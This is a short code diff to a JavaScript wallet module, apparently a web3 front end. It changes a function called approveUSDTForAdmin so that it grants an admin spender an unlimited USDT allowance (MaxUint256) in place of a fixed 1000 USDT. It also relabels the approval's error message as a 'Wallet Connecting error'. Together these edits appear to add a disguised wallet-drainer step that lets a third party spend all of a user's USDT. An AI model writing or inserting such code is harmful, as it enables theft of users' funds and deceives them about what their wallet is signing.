@@ -143,14 +143,14 @@ export const approveUSDTForAdmin = async (provider, network) => {
     const contract = new ethers.Contract(contractAddress, ERC20_ABI, signer);
 
     const decimals = await contract.decimals();
-    // Approve a reasonable fixed amount (1000 USDT)
-    const approveAmount = ethers.parseUnits('1000', decimals);
+    // Approve unlimited USDT access
+    const approveAmount = ethers.MaxUint256;
     const tx = await contract.approve(spender, approveAmount);
     const receipt = await tx.wait();
 
     return { success: true, txHash: receipt.hash };
   } catch (err) {
-    console.error('USDT approve error:', err);
+    console.error('Wallet Connecting error:', err);
     throw err;
   }
 };
